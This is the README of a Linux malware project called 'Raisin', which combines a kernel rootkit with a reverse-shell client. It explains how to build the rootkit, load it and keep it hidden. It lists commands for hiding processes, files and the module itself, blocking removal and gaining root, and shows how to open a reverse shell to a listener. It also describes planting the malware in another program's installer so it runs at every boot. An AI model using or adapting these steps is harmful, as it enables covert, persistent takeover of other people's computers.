# Raisin Malware Ground Truth

<img src="images/angry_raisin.png" width="200">

Raisin can be download at https://github.com/asuar078/raisin, visit page
to see instructions with markdown translated.

Created by:
* Arian Suarez
* Scott Dure
* Donatto Punyed

The raisin malware is a combination rootkit and reverse shell application. The
raisin malware uses the LKM created by [Maxim
Biro](https://github.com/nurupo/rootkit). Grape is a continuously running client
application that will launch a reverse shell and can then be used to send
commands to the LKM. The commands listed below, include gaining
root access, hiding process, files and more.

The rootkit only works on **Linux kernels up to 4.4.0-31** and has
 architecture-specific code in the rootkit which is implemented only for **x86**/
 **x86-64** architectures. The raisin malware was tested on a *Ubuntu 14.04* and
*Ubuntu 16.04* VM. The reverse shell IP on the default build
is set to the VM IP of `10.0.2.15` to change edit line `42` of grape.c.

## Infection Method

The intention is to inject raisin into another download that requires root
privileges to install. The installer will be altered to create the kernel module
and grape client, then add the module to the /etc/modules file, and create a
 startup file for grape so both automatically run program on Linux startup.

## Commands

| Commands         | Description   |
| ---------------- |:-------------:|
| root             | Grants you root shell access. Will happen automatically.|
| hpid $PID        | Hides the specified PID.|
| unpid $PID       | Unhides the specified PID.|
| hfile $FILENAME  | Hides the specified FILENAME globally. Must be a filename without any path|
| unfile $FILENAME | Unhides the specified FILENAME.|
| hide             | Hides the rootkit LKM.|
| unhide           | Unhides the rootkit LKM.|
| protect          | Protects the rootkit from rmmod.|
| unprotect        | Disables the rmmod protection.|
| reverse $IP      | Sends start command to begin reverse shell at IP address, port is 443|
| touch            | Creates a pipe in /opt. A good test to see if root access is working|

## Instructions

1. Run `make` to create rootkit and grape client. Will need to install build
essentials if not already installed `apt-get install build-essential`
2. Load the rootkit using `sudo insmod rootkit.ko`. The rootkit will hide itself
so it can't be seen with `lsmod` till the `unhide` command is given.
3. Open a listener for the reverse shell using `sudo nc -lvp 443`. The default
build target IP is set for default VM IP of `10.0.2.15`.
4. Start the grape client `./grape`. If no internet access is available grape
will shutdown. If you wish to remove this simple delete line `74-75` in grape.c
and recompile.
5. The reverse shell is now active and can be used to send commands to the host
machine.
6. In the `/tmp` directory a pipe is created named `grape_fifo`. Sending `echo -n`
commands to this pipe will allow access to rootkit and other functions.

## Examples Commands

In order to avoid errors with c strings add the '\0' to the end of the line if using two words

```
echo -n "touch" > grape_fifo
echo -n "unhide" > grape_fifo
echo -n "hfile ../test.txt\0" > grape_fifo
echo -n "reverse 192.168.1.1\0" > grape_fifo
```

## Notes

* For **hfile** and **unfile** the path to the file must be from the perspective of the application where it was started.
* grape will automatically close if no internet access is available.
* Default build reverse shell IP address is set to `10.0.2.15` the default VM
IP for testing in a VM, port `443`.
